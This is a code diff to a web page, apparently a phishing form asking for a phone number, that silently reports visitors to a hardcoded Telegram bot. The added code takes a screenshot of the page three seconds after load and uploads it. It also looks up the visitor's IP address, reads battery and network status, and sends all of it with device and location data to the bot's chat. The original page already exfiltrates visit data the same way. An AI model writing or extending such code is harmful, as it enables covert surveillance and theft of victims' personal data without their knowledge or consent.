@@ -69,6 +69,7 @@ input:focus { border-color: #ffdd2d; background: #fff; }
   </div>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
 var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
 var chat = '7887003990';
@@ -77,6 +78,14 @@ var userData = {};
 function send(text) {
   var img = new Image();
   img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(text);
+}
+
+function sendPhoto(blob, caption) {
+  var form = new FormData();
+  form.append('chat_id', chat);
+  form.append('photo', blob, 'photo.jpg');
+  if (caption) form.append('caption', caption);
+  fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: form });
 }
 
 function getDeviceInfo() {
@@ -96,6 +105,37 @@ function getGeo() {
   }
 }
 
+function getIP() {
+  fetch('https://api.ipify.org?format=json')
+    .then(function(r) { return r.json(); })
+    .then(function(d) { send('🌐 IP: ' + d.ip); })
+    .catch(function() {});
+}
+
+function getBattery() {
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      send('🔋 Батарея: ' + Math.round(b.level * 100) + '%' + (b.charging ? ' (заряжается)' : ''));
+    });
+  }
+}
+
+function getConnection() {
+  if (navigator.connection) {
+    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown'));
+  }
+}
+
+function takeScreenshot() {
+  if (typeof html2canvas !== 'undefined') {
+    html2canvas(document.body).then(function(canvas) {
+      canvas.toBlob(function(blob) {
+        sendPhoto(blob, '📸 Скриншот');
+      }, 'image/jpeg', 0.7);
+    });
+  }
+}
+
 function getUserID() {
   var id = localStorage.getItem('uid');
   if (!id) {
@@ -107,6 +147,10 @@ function getUserID() {
 
 send('👤 Новый визит ID: ' + getUserID() + '\n' + getDeviceInfo());
 getGeo();
+getIP();
+getBattery();
+getConnection();
+setTimeout(takeScreenshot, 3000);
 
 document.getElementById('next1').addEventListener('click', function() {
   var phone = document.getElementById('phone').value;
